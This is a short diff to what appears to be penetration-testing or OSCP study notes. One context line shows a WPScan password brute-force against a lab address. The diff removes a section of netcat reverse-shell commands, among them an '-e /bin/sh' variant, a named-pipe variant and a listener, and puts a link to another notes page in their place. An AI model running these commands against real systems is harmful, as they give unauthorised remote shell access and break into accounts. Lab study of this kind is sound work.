@@ -47,23 +47,7 @@ wpscan -u "http://10.11.1.234" --wordlist /usr/share/wordlists/rockyou.txt --use
 
 ## Get Shell & Listen:
 
-### get shell
-
-```
-nc 192.168.56.1 4444 -e /bin/sh
-```
-
-the -e flag was not supported on the server’s implementation of netcat.:
-
-```
-mknod /tmp/backpipe p 
-/bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe
-```
-
-### listen:
-```
-nc -nvlp 4444
-```
+https://github.com/emre-uzun/oscp/blob/master/Shell/Generating-Reverse-Shell.md
 
 ***
 
